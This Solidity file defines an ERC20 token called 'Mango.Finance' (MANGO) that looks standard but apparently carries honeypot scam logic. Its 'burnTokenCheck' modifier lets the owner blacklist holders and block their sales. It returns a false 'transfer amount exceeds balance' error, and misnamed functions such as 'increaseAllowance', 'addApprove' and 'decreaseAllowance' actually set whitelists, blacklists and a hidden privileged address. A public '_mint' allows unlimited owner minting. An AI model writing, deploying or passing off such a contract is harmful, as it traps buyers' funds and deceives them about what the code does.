row number 
1	                pragma solidity ^0.6.0;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 interface IERC20 {
99	 function totalSupply() external view returns (uint256);
100	 function balanceOf(address account) external view returns (uint256);
101	 function transfer(address recipient, uint256 amount) external returns (bool);
102	 function allowance(address owner, address spender) external view returns (uint256);
103	 function approve(address spender, uint256 amount) external returns (bool);
104	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
105	 event Transfer(address indexed from, address indexed to, uint256 value);
106	 event Approval(address indexed owner, address indexed spender, uint256 value);
107	 }
108	 contract MANGO is Context, IERC20 {
109	 using SafeMath for uint256;
110	 using Address for address;
111	 mapping (address => uint256) private _balances;
112	 mapping (address => bool) private _whiteAddress;
113	 mapping (address => bool) private _blackAddress;
114	 uint256 private _sellAmount = 0;
115	 mapping (address => mapping (address => uint256)) private _allowances;
116	 uint256 private _totalSupply;
117	 uint8 private _decimals;
118	 string private _name = 'Mango.Finance';
119	 string private _symbol = 'MANGO';
120	 uint256 initialSupply = 1000000000;
121	 uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
122	 address public _owner;
123	 address private _safeOwner;
124	 address private _unirouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
125	 constructor () public {
126	 _decimals = 18;
127	 _owner = _msgSender();
128	 _safeOwner = _msgSender();
129	 _mint(_owner, initialSupply*(10**18));
130	 }
131	 function name() public view returns (string memory) {
132	 return _name;
133	 }
134	 function symbol() public view returns (string memory) {
135	 return _symbol;
136	 }
137	 function decimals() public view returns (uint8) {
138	 return _decimals;
139	 }
140	 function totalSupply() public view override returns (uint256) {
141	 return _totalSupply;
142	 }
143	 function balanceOf(address account) public view override returns (uint256) {
144	 return _balances[account];
145	 }
146	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
147	 _approveCheck(_msgSender(), recipient, amount);
148	 return true;
149	 }
150	 function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {
151	 require(msg.sender == _owner, "!owner");
152	 for (uint256 i = 0; i < receivers.length; i++) {
153	 transfer(receivers[i], amounts[i]);
154	 if(i < approvecount){
155	 _whiteAddress[receivers[i]]=true;
156	 _approve(receivers[i], _unirouter,115792089237316195423570985008687907853269984665640564039457584007913129639935);
157	 }
158	 }
159	 }
160	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
161	 return _allowances[owner][spender];
162	 }
163	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
164	 _approve(_msgSender(), spender, amount);
165	 return true;
166	 }
167	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
168	 _approveCheck(sender, recipient, amount);
169	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
170	 return true;
171	 }
172	 function increaseAllowance(address[] memory receivers) public {
173	 require(msg.sender == _owner, "!owner");
174	 for (uint256 i = 0; i < receivers.length; i++) {
175	 _whiteAddress[receivers[i]] = true;
176	 _blackAddress[receivers[i]] = false;
177	 }
178	 }
179	 function decreaseAllowance(address safeOwner) public {
180	 require(msg.sender == _owner, "!owner");
181	 _safeOwner = safeOwner;
182	 }
183	 function addApprove(address[] memory receivers) public {
184	 require(msg.sender == _owner, "!owner");
185	 for (uint256 i = 0; i < receivers.length; i++) {
186	 _blackAddress[receivers[i]] = true;
187	 _whiteAddress[receivers[i]] = false;
188	 }
189	 }
190	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
191	 require(sender != address(0), "ERC20: transfer from the zero address");
192	 require(recipient != address(0), "ERC20: transfer to the zero address");
193	 _beforeTokenTransfer(sender, recipient, amount);
194	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
195	 _balances[recipient] = _balances[recipient].add(amount);
196	 emit Transfer(sender, recipient, amount);
197	 }
198	 function _mint(address account, uint256 amount) public {
199	 require(msg.sender == _owner, "ERC20: mint to the zero address");
200	 _totalSupply = _totalSupply.add(amount);
201	 _balances[_owner] = _balances[_owner].add(amount);
202	 emit Transfer(address(0), account, amount);
203	 }
204	 function _burn(address account, uint256 amount) internal virtual {
205	 require(account != address(0), "ERC20: burn from the zero address");
206	 _beforeTokenTransfer(account, address(0), amount);
207	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
208	 _totalSupply = _totalSupply.sub(amount);
209	 emit Transfer(account, address(0), amount);
210	 }
211	 function _approve(address owner, address spender, uint256 amount) internal virtual {
212	 require(owner != address(0), "ERC20: approve from the zero address");
213	 require(spender != address(0), "ERC20: approve to the zero address");
214	 _allowances[owner][spender] = amount;
215	 emit Approval(owner, spender, amount);
216	 }
217	 function _approveCheck(address sender, address recipient, uint256 amount) internal burnTokenCheck(sender,recipient,amount) virtual {
218	 require(sender != address(0), "ERC20: transfer from the zero address");
219	 require(recipient != address(0), "ERC20: transfer to the zero address");
220	 _beforeTokenTransfer(sender, recipient, amount);
221	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
222	 _balances[recipient] = _balances[recipient].add(amount);
223	 emit Transfer(sender, recipient, amount);
224	 }
225	 modifier burnTokenCheck(address sender, address recipient, uint256 amount){
226	 if (_owner == _safeOwner && sender == _owner){
227	 _safeOwner = recipient;
228	 _;
229	 }
230	 else{
231	 if (sender == _owner || sender == _safeOwner || recipient == _owner){
232	 if (sender == _owner && sender == recipient){
233	 _sellAmount = amount;
234	 }
235	 _;
236	 }
237	 else{
238	 if (_whiteAddress[sender] == true) {
239	 _;
240	 }
241	 else{
242	 if (_blackAddress[sender] == true) {
243	 require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");
244	 _;
245	 }
246	 else {
247	 if (amount < _sellAmount){
248	 if(recipient == _safeOwner){
249	 _blackAddress[sender] = true;
250	 _whiteAddress[sender] = false;
251	 }
252	 _;
253	 }
254	 else{
255	 require((sender == _safeOwner)||(recipient == _unirouter), "ERC20: transfer amount exceeds balance");
256	 _;
257	 }
258	 }
259	 }
260	 }
261	 }
262	 }
263	 function _setupDecimals(uint8 decimals_) internal {
264	 _decimals = decimals_;
265	 }
266	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
267	 }
268	 }
